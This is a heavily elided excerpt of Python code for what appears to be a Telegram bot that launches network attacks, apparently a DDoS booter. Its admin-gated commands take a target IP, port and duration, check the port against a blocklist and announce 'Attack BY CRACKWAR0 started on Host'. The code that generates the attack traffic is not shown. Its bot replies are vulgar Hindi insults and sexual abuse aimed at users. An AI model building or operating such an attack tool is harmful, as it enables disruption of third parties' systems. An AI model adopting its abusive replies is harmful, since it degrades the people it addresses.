...
ADMIN_IDS = [948895728, 6060545769, 1871909759]
...
def disapprove_user(message):
    if not is_user_admin(message.from_user.id, message.chat.id):
        bot.send_message(message.chat.id, "TERE BAAP NE HOTEL KHOL RAKHI KE", parse_mode='Markdown')
        return
    ...
    try:
        ...
        bot.send_message(message.chat.id, "BACCHE TERI MAA KI CHUT", parse_mode='Markdown')
...
def attack_command(message):
    ...
    bot.send_message(message.chat.id, "*CHUTIA AADMI IP PORT TIME AISE BHEJO WRNA GAAND MAAR LUNGA.*", parse_mode='Markdown')
...
def process_attack_ip_port(message):
    try:
        ...
        if len(args) != 2:
            bot.send_message(message.chat.id, "THEEK SE DAALO BE CHUTIA HO KYA", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} BHOSDK YE PORT BLOCKED HA.*", parse_mode='Markdown')
            return
...
def start_attack(message):
    ...
    if attack_details:
        ...
        bot.send_message(message.chat.id, f"*Attack BY CRACKWAR0 started on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
    else:
